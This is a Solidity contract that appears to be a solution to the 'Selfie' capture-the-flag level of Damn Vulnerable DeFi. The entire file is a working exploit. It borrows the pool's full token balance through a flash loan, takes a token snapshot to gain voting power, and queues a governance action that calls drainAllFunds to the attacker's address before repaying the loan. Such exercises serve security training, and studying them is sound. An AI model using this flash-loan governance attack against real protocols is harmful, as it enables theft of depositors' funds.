//SPDX-License-Identifier:MIT
pragma solidity ^0.8.7;
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

contract SelfieAttacker {

    SimpleGovernance private governance;
    SelfiePool private pool;
    DamnValuableTokenSnapshot private token;


    address private attacker;
    uint256 private actionId;

    constructor(address _governance, address _pool, address _token) {

        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);
        attacker = msg.sender;
    }
    function receiveTokens(address _token, uint256 _amount ) public {
        console.log("entering receive tokens");
        // queue an action with following parameters
        // receiver -> address(this)
        // data -> abi.encodeWithSignature(drainFunds())
        // weiAmount = _amount
        DamnValuableTokenSnapshot(_token).snapshot();
        actionId = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", tx.origin), 0);

        bool success = token.transfer(address(pool), _amount);
        require(success, "failed to transfer DMV token back to flash loan pool");    

    }

    function exploit() public {
        console.log("entering exploit");
        // first take a flash loan for entire amount of the selfie pool
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
  
    }

    function getActionId() public view returns(uint256){
        return actionId;
    }
}